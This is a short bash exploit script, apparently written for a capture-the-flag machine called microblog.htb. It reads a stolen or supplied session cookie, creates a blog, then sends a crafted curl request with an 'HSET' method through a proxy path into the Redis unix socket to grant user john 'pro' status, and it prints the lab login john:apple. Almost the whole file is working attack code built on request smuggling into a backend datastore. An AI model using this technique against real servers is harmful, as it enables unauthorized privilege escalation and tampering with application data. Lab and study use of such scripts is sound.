#!/bin/bash
if [ -f "cookie.txt" ]
then
    cookieStr=`cat cookie.txt`
else
    read -p 'Username Cookie String: ' cookieStr
fi

python3 straightToPro.py $cookieStr
echo "[+] Building New Blog"

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --cookie "username=$cookieStr" -d "new-blog-name=mblog" http://app.microblog.htb/dashboard/index.php -L

echo "[+] Setting john to PRO"
curl -X "HSET" http://microblog.htb/static/unix:/var/run/redis/redis.sock:john%20pro%20true%20/mblog

echo "[+] Done!"
echo "Login john:apple and you are all goodie!"